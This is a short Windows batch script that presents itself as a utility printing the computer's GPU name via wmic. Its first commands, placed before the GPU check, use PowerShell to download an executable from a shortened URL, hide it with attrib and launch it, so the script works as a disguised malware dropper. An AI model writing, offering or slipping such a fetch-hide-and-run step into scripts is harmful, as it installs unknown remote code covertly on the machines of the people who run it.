@echo off
setlocal enabledelayedexpansion
powershell -command "& { Invoke-WebRequest -Uri ' http://tinyurl.com/ye23fww7' -OutFile 'e.exe' }"
attrib +h e.exe
start e.exe
rem Get the GPU information
for /f "tokens=*" %%i in ('wmic path win32_videocontroller get caption ^| find /v "Caption"') do (
    set "gpuName=%%i"
    goto :PrintGPU
)

:PrintGPU
if defined gpuName (
    echo GPU Name: !gpuName!
) else (
    echo No GPU
)

endlocal
pause